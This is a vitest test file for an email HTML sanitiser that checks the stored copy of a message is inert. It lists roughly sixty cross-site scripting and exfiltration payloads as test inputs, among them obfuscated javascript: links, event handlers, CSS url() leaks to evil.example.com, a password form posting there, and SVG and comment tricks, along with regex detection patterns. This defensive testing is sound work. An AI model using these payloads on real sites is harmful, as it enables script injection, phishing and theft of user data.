import { describe, expect, it } from "vitest";

import { sanitiseForStorage } from "@/lib/backstage/mail/sanitise";

/**
 * Hostile HTML, thrown at the one pass there is: the one that makes the
 * copy a message is stored with. That copy is never shown as HTML (the
 * inbox shows a message's plain text, and tests/backstage/mail.test.ts and
 * the browser tests hold it there). This file holds the copy itself to
 * being inert, so the column it sits in is never a place hostile markup
 * lives.
 */

const clean = (html: string) => sanitiseForStorage(html).html;

const TAGS = new Set(
  "p br hr div span blockquote pre code h1 h2 h3 h4 h5 h6 b strong i em u s strike del ins small big sub sup mark abbr cite q kbd samp var tt center font a ul ol li dl dt dd table thead tbody tfoot tr td th caption colgroup col img".split(
    " ",
  ),
);
const ATTRIBUTES = new Set(
  "style title dir lang align valign href target rel src data-src alt width height border cellpadding cellspacing bgcolor colspan rowspan nowrap scope span color size face start type value".split(
    " ",
  ),
);

/**
 * Read cleaned HTML the strict way: every `<` must open a tag from the
 * allow-list whose attributes are all `name="value"` with names from the
 * allow-list. Anything else throws. This is what "nothing got through"
 * means, said structurally instead of by looking for particular strings.
 */
function tagsOf(
  html: string,
): { name: string; attrs: Record<string, string> }[] {
  const out: { name: string; attrs: Record<string, string> }[] = [];
  const tag =
    /<(\/?)([a-z][a-z0-9]*)((?:\s+[a-z][a-z0-9-]*(?:="[^"<>]*")?)*)\s*\/?>/gy;
  let at = 0;
  while (at < html.length) {
    const open = html.indexOf("<", at);
    if (open === -1) break;
    tag.lastIndex = open;
    const match = tag.exec(html);
    if (match === null) {
      throw new Error(`not a clean tag at: ${html.slice(open, open + 60)}`);
    }
    const [, closing, name = "", rawAttrs = ""] = match;
    if (!TAGS.has(name)) throw new Error(`tag not allowed: ${name}`);
    const attrs: Record<string, string> = {};
    for (const attr of rawAttrs.matchAll(/([a-z][a-z0-9-]*)(?:="([^"]*)")?/g)) {
      const key = attr[1] ?? "";
      if (!ATTRIBUTES.has(key))
        throw new Error(`attribute not allowed: ${key}`);
      attrs[key] = attr[2] ?? "";
    }
    if (closing === "") out.push({ name, attrs });
    at = tag.lastIndex;
  }
  // With every clean tag taken out, what is left is text, and text has no
  // brackets in it: they are written as &lt; and &gt;.
  const leftover = html.replace(
    /<\/?[a-z][a-z0-9]*(?:\s+[a-z][a-z0-9-]*(?:="[^"<>]*")?)*\s*\/?>/g,
    "",
  );
  if (/[<>]/.test(leftover)) throw new Error(`stray bracket in: ${leftover}`);
  return out;
}

/** No address anywhere in the output that a browser would run or fetch from. */
function expectInert(html: string): void {
  const tags = tagsOf(html);
  for (const { name, attrs } of tags) {
    if (attrs.href !== undefined) {
      expect(attrs.href, `${name} href`).toMatch(/^(https?:\/\/|mailto:|tel:)/);
    }
    if (attrs.src !== undefined) {
      // A kept picture's src is only ever its own bytes.
      expect(attrs.src, `${name} src`).toMatch(
        /^data:image\/(png|jpeg|jpg|gif|webp);base64,/,
      );
    }
    if (attrs["data-src"] !== undefined) {
      expect(attrs["data-src"], `${name} data-src`).toMatch(/^https?:\/\//);
    }
    if (attrs.style !== undefined) {
      expect(attrs.style).not.toMatch(
        /url|expression|position|z-index|behavior|binding|@import|javascript/i,
      );
    }
  }
  expect(html).not.toMatch(/javascript:|vbscript:|data:text|livescript:/i);
}

const HOSTILE: readonly (readonly [string, string])[] = [
  ["a script tag", "<p>hi</p><script>alert(1)</script>"],
  ["a script tag in odd case", "<ScRiPt SRC=//evil.example.com/x.js></sCrIpT>"],
  [
    "a script hidden in a broken tag",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
  ],
  ["an onerror handler", '<img src="x" onerror="alert(1)">'],
  ["an onerror handler with no quotes", "<img src=x onerror=alert(1)>"],
  ["an onload on the body", '<body onload="alert(1)"><p>hi</p></body>'],
  [
    "a handler on an allowed tag",
    '<p onclick="alert(1)" onmouseover=alert(2)>hi</p>',
  ],
  ["a javascript link", '<a href="javascript:alert(1)">click</a>'],
  ["a javascript link in odd case", '<a href="JaVaScRiPt:alert(1)">click</a>'],
  [
    "a javascript link with a tab in it",
    '<a href="java\tscript:alert(1)">click</a>',
  ],
  [
    "a javascript link with a line break in it",
    '<a href="java\nscript:alert(1)">click</a>',
  ],
  [
    "a javascript link behind entities",
    '<a href="&#106;&#97;&#118;&#97;script:alert(1)">click</a>',
  ],
  [
    "a javascript link with a leading space",
    '<a href="  javascript:alert(1)">click</a>',
  ],
  ["a vbscript link", '<a href="vbscript:msgbox(1)">click</a>'],
  [
    "a data link",
    '<a href="data:text/html,<script>alert(1)</script>">click</a>',
  ],
  [
    "a data link in base64",
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
  ],
  [
    "a style block with an import",
    '<style>@import url("https://evil.example.com/x.css"); p{color:red}</style><p>hi</p>',
  ],
  [
    "a style block that reads the page",
    "<style>a[href^=h]{background:url(https://evil.example.com/?h)}</style><a href=https://ok.example.com>x</a>",
  ],
  [
    "a link to a stylesheet",
    '<link rel="stylesheet" href="https://evil.example.com/x.css">',
  ],
  [
    "a form",
    '<form action="https://evil.example.com/collect" method="post"><input name="password" type="password"><button formaction="https://evil.example.com/2">Sign in</button></form>',
  ],
  ["a lone input that grabs focus", '<input autofocus onfocus="alert(1)">'],
  [
    "a tracking pixel",
    '<img src="https://track.example.com/open.gif?id=42" width="1" height="1">',
  ],
  [
    "a tracking pixel in a srcset",
    '<img srcset="https://track.example.com/a.gif 1x, https://track.example.com/b.gif 2x" alt="x">',
  ],
  [
    "a tracking pixel with no scheme",
    '<img src="//track.example.com/open.gif">',
  ],
  [
    "a picture off our own site",
    '<img src="/backstage/files/fil_someoneelses1234567?view=1">',
  ],
  [
    "an svg with a script",
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script><circle r="4"/></svg>',
  ],
  [
    "an svg with a javascript link",
    '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  ],
  [
    "an svg that animates a link",
    '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>',
  ],
  [
    "an svg as a picture",
    '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+">',
  ],
  [
    "an svg as a picture, unencoded",
    "<img src='data:image/svg+xml,<svg onload=alert(1)>'>",
  ],
  [
    "a meta refresh",
    '<meta http-equiv="refresh" content="0; url=https://evil.example.com/">',
  ],
  [
    "a meta refresh to javascript",
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  ],
  [
    "a base href",
    '<base href="https://evil.example.com/"><a href="/login">Sign in</a>',
  ],
  [
    "a base target",
    '<base target="_top"><a href="https://ok.example.com/">x</a>',
  ],
  ["an iframe", '<iframe src="https://evil.example.com/"></iframe>'],
  [
    "an iframe with its own page inside",
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  ],
  [
    "an object and an embed",
    '<object data="https://evil.example.com/x.swf"></object><embed src="https://evil.example.com/x.swf">',
  ],
  [
    "a video with a handler",
    '<video><source src="x" onerror="alert(1)"></video><audio src="x" onerror="alert(2)"></audio>',
  ],
  [
    "a details toggle handler",
    '<details open ontoggle="alert(1)"><summary>x</summary></details>',
  ],
  ["a marquee handler", '<marquee onstart="alert(1)">x</marquee>'],
  [
    "a style that covers the page",
    '<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:url(https://evil.example.com/overlay.png)">Your session has ended</div>',
  ],
  ["a style with an expression", '<p style="width:expression(alert(1))">x</p>'],
  [
    "a style with a background image",
    '<p style="background-image:url(https://track.example.com/bg.gif)">x</p>',
  ],
  [
    "a style with a moz-binding",
    '<p style="-moz-binding:url(https://evil.example.com/x.xml#y)">x</p>',
  ],
  [
    "a style with an escaped url",
    '<p style="background:\\75rl(https://evil.example.com/x)">x</p>',
  ],
  [
    "a style that breaks out of its attribute",
    '<p style="color:red&quot; onclick=&quot;alert(1)">x</p>',
  ],
  [
    "a border with a url in it",
    '<p style="border:1px solid url(https://evil.example.com/x)">x</p>',
  ],
  [
    "a table background",
    '<table background="https://track.example.com/bg.gif"><tr><td background="https://track.example.com/2.gif">x</td></tr></table>',
  ],
  [
    "a link with sign-in details in it",
    '<a href="https://quickpickle.co.nz@evil.example.com/login">quickpickle.co.nz</a>',
  ],
  [
    "a link that opens over the back end",
    '<a href="https://ok.example.com/" target="_top">x</a>',
  ],
  [
    "a noscript trick",
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  ],
  ["a comment trick", "<!--><img src=x onerror=alert(1)>-->"],
  [
    "a conditional comment",
    "<!--[if gte mso 9]><script>alert(1)</script><![endif]-->",
  ],
  ["a textarea trick", "<textarea></textarea><img src=x onerror=alert(1)>"],
  ["a title trick", "<title><img src=x onerror=alert(1)></title>"],
  ["a template", "<template><script>alert(1)</script></template>"],
  [
    "math",
    '<math><maction actiontype="statusline#https://evil.example.com" xlink:href="javascript:alert(1)">x</maction></math>',
  ],
  ["an attribute name with a slash in it", '<img/src="x"/onerror=alert(1)>'],
  ["ids and classes", '<p id="main" class="bk-btn sr-only">x</p>'],
  [
    "an unclosed tag at the end",
    '<p>fine</p><img src="https://track.example.com/x.gif" onerror="alert(1)"',
  ],
  ["a null byte in a tag name", "<scr\u0000ipt>alert(1)</scr\u0000ipt>"],
];

describe("the copy that is kept", () => {
  it.each(HOSTILE)("defuses %s", (_name, html) => {
    expectInert(clean(html));
  });

  it("removes scripts and their contents, not just the tags", () => {
    const out = clean(
      "<p>before</p><script>var stolen = document.cookie;</script><style>p{background:url(//evil.example.com/t.gif)}</style><p>after</p>",
    );
    expect(out).toBe("<p>before</p><p>after</p>");
    expect(clean("<noscript><p>hidden</p></noscript>ok")).toBe("ok");
    expect(clean("<title>x</title><textarea>y</textarea>ok")).toBe("ok");
    expect(clean("<svg><script>alert(1)</script><text>z</text></svg>ok")).toBe(
      "ok",
    );
  });

  it("keeps a link's words when the link itself has to go", () => {
    expect(clean('<a href="javascript:alert(1)">click here</a>')).toBe(
      "click here",
    );
    expect(clean('<a href="//evil.example.com">protocol-relative</a>')).toBe(
      "protocol-relative",
    );
    expect(clean("<a>no address</a>")).toBe("no address");
  });

  it("makes every surviving link open safely in a new tab", () => {
    const [link] = tagsOf(
      clean(
        '<a href="https://example.com/a?b=1&c=2" target="_top" rel="opener" onclick="x()">go</a>',
      ),
    );
    expect(link?.attrs).toEqual({
      href: "https://example.com/a?b=1&amp;c=2",
      target: "_blank",
      rel: "noopener noreferrer nofollow",
    });
    expect(clean('<a href="mailto:hello@example.com">write</a>')).toContain(
      'href="mailto:hello@example.com"',
    );
    // An address with sign-in details in front of the host is a trick.
    expect(
      clean('<a href="https://quickpickle.co.nz@evil.example.com/">x</a>'),
    ).toBe("x");
  });

  it("moves remote pictures aside where nothing loads them, and counts them", () => {
    const result = sanitiseForStorage(
      '<p>Hello</p><img src="https://tracker.example.com/open.gif?u=42" width="1" height="1"><img src="http://example.com/logo.png" alt="Logo">',
    );
    const pictures = tagsOf(result.html).filter((tag) => tag.name === "img");
    expect(pictures).toHaveLength(2);
    for (const picture of pictures) expect(picture.attrs.src).toBeUndefined();
    expect(pictures[0]?.attrs["data-src"]).toBe(
      "https://tracker.example.com/open.gif?u=42",
    );
    expect(result.pictures).toBe(2);
    expect(result.html).not.toMatch(/\ssrc="/);
  });

  it("keeps a picture that is carried inside the message, unless it is an svg", () => {
    const png =
      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==";
    expect(
      clean(`<img src="data:image/png;base64,${png}" alt="dot">`),
    ).toContain(`src="data:image/png;base64,${png}"`);
    expect(
      clean('<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="svg">'),
    ).toBe('<img alt="svg" />');
    expect(
      clean('<img src="data:text/html;base64,PHNjcmlwdD4=" alt="x">'),
    ).toBe('<img alt="x" />');
  });

  it("counts the message's own pictures and keeps none of their addresses", () => {
    const result = sanitiseForStorage(
      '<p>See</p><img src="cid:photo-1@mail.example.com" alt="The parcel"><img src="CID:%3Clogo%3E">',
    );
    expect(result.pictures).toBe(2);
    expect(result.html).not.toMatch(/cid:/i);
    expect(tagsOf(result.html).filter((tag) => tag.name === "img")).toEqual([
      { name: "img", attrs: { alt: "The parcel" } },
    ]);
  });

  it("keeps the formatting an honest email uses", () => {
    const html =
      '<h2>Quote</h2><p>Hi <b>Ashleigh</b>, <i>thanks</i>.</p><ul><li>one</li><li>two</li></ul><table><tbody><tr><td colspan="2">cell</td></tr></tbody></table><blockquote>earlier</blockquote>';
    expect(clean(html)).toBe(html);
  });

  it("keeps only the inline styles on the list", () => {
    const out = clean(
      '<p style="color: red; position: fixed; top: 0; background-image: url(https://evil.example.com/a.png); font-weight: bold; z-index: 99999; width: expression(alert(1)); margin: 0 auto">x</p>',
    );
    const [p] = tagsOf(out);
    expect(p?.attrs.style).toBe("color:red;font-weight:bold;margin:0 auto");
  });

  it("escapes text so it cannot become markup later", () => {
    expect(clean("1 < 2 and <b>3 > 2</b> &lt;script&gt;")).toBe(
      "1 &lt; 2 and <b>3 &gt; 2</b> &lt;script&gt;",
    );
    expect(clean('<p title="a&quot;b">x</p>')).toBe(
      '<p title="a&quot;b">x</p>',
    );
  });

  it("flattens nesting deeper than any real email goes", () => {
    const deep = `${"<div>".repeat(400)}bottom${"</div>".repeat(400)}`;
    const out = clean(deep);
    expect(out).toContain("bottom");
    expect(tagsOf(out).length).toBeLessThanOrEqual(80);
  });
});
